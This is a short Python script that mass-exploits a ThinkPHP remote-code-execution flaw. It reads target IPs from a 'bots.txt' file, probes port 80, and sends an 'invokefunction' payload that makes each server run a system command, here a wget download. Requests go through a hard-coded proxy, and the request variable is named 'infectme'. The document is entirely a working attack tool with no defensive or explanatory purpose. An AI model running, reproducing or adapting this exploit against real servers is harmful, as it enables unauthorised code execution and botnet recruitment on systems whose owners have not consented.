import requests
import socket
file = "bots.txt"
payload = r"index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=wget%20https://google.com/"
proxyList = {
              "http"  : "http://86.57.223.177:41096",
              "https" : "https://86.57.223.177:41096",
            }

with open(file, "r") as f:
    for line in f:
        print("Connecting to: " + line.rstrip())
        ip = str(line.rstrip())
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex((ip,80))
        if result == 0:
            print("Connection to {} successful.".format(ip))
            infectme = "http://" + ip + "/" + payload.rstrip()
            requests.get(infectme, verify=False, proxies=proxyList)
            print("Payload Sent.")
        else:
            print("Rip")
            infectme = "https://" + ip + "/" + payload.rstrip()
            requests.get(infectme, verify=False, proxies=proxyList)
            print("Payload Sent via SSL.")
        sock.close()
